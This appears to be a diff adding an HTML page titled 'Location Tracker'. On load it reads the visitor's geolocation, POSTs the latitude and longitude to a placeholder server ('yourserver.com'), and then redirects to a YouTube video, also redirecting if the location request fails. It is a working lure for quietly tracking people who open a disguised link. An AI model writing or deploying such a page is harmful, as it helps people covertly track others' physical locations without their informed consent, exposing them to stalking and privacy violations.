@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Tracker</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+
+                        // Send data to your server
+                        fetch("https://yourserver.com/log_location", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ latitude: lat, longitude: lon })
+                        });
+
+                        // Redirect to YouTube video
+                        window.location.href = "https://www.youtube.com/watch?v=YOUR_VIDEO_ID";
+                    },
+                    function(error) {
+                        console.log("Error getting location:", error);
+                        // Redirect even if location fails
+                        window.location.href = "https://www.youtube.com/watch?v=YOUR_VIDEO_ID";
+                    }
+                );
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+                window.location.href = "https://www.youtube.com/watch?v=YOUR_VIDEO_ID";
+            }
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <h2>Fetching your location...</h2>
+</body>
+</html>
